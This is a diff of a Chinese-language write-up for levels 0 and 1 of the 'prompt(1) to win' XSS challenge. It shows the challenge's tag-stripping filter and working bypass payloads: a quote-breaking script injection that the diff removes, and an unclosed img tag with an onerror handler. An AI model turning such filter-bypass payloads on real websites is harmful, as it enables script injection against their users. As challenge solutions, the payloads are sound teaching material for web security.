@@ -1,4 +1,4 @@
-## [[prompt(1) to win](http://prompt.ml)] [[Level 0 - warm up](http://prompt.ml/0)] [[解题报告](http://exp-blog.com/2019/03/18/pid-3613/)]
+## [[prompt(1) to win](http://prompt.ml)] [[Level 1 - tags stripping](http://prompt.ml/1)] [[解题报告](http://exp-blog.com/2019/03/18/pid-3623/)]
 
 ------
 
@@ -6,9 +6,12 @@
 
 ```javascript
 function escape(input) {
-    // warm up
-    // script should be executed without user interaction
-    return '<input type="text" value="' + input + '">';
+    // tags stripping mechanism from ExtJS library
+    // Ext.util.Format.stripTags
+    var stripTagsRE = /<\/?[^>]+>/gi;
+    input = input.replace(stripTagsRE, '');
+
+    return '<article>' + input + '</article>';
 }
 ```
 
@@ -16,11 +19,13 @@ function escape(input) {
 
 ## 解题报告
 
-水题。直接闭合双引号和标签即可注入。
+注意观察正则表达式，它会把所有匹配 `<tag>` 或 `</tag>` 的标签全部剥离。
 
-payload : `"><script>prompt(1)</script>`
+那么不构造完整的 tag 、仅通过属性注入就可以绕过了，如这样的 payload ：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/ce464cfe08916a3488b01d603044f324.png)
+`<img src=0 onerror=prompt(1) ` （**注意末尾有一个空格**）
+
+![](http://exp-blog.com/wp-content/uploads/2019/03/accd9b1c3fb286c6ed3b9f4397b21e33.png)
 
 ------
 
